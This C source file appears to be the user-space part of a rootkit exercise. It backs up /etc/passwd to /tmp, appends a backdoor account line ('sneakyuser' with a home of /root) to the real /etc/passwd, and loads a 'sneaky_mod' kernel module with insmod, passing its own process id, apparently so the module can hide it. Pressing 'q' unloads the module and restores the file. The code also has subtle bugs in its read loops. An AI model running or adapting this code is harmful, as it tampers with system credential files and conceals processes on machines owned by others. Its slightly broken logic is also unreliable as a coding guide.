#include <linux/module.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
  int pid = getpid();
  char pidstr[10];
  sprintf(pidstr, "%d", pid);
  printf("sneaky_process pid = %d, %s\n", pid, pidstr);

  FILE * f = fopen("/etc/passwd", "r+");
  FILE * fd = fopen("/tmp/passwd", "w");

  // contrast
  //  FILE * fdd = fopen("test.txt", "w");

  size_t sz = 0;
  ssize_t len = 0;
  char * line = NULL;

  while (len = (getline(&line, &sz, f)) >= 0) {
    // printf("%s", line);
    fprintf(fd, "%s", line);
    // fprintf(fdd, "%s", line);
  }

  fprintf(f, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  // fprintf(fdd, "%s", "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  free(line);
  fclose(f);
  fclose(fd);
  // fclose(fdd);
  printf("sneaky passwordy stuff done\n");
  char insn1[64];
  sprintf(insn1, "insmod sneaky_mod.ko pid=%d pidstr=%s", pid, pidstr);
  system(insn1);
  char q;

  while (q = (getchar()) != 'q') {
    continue;
  }
  system("rmmod sneaky_mod");
  f = fopen("/etc/passwd", "w");
  fd = fopen("/tmp/passwd", "r");
  // fdd = fopen("test.txt", "w");

  sz = 0;
  len = 0;
  line = NULL;

  while (len = (getline(&line, &sz, fd)) >= 0) {
    //  printf("%s", line);
    fprintf(f, "%s", line);
    // fprintf(fdd, "%s", line);
  }
  free(line);
  fclose(f);
  fclose(fd);
  // fclose(fdd);

  printf("sneaky passwordy stuff undone\n");
}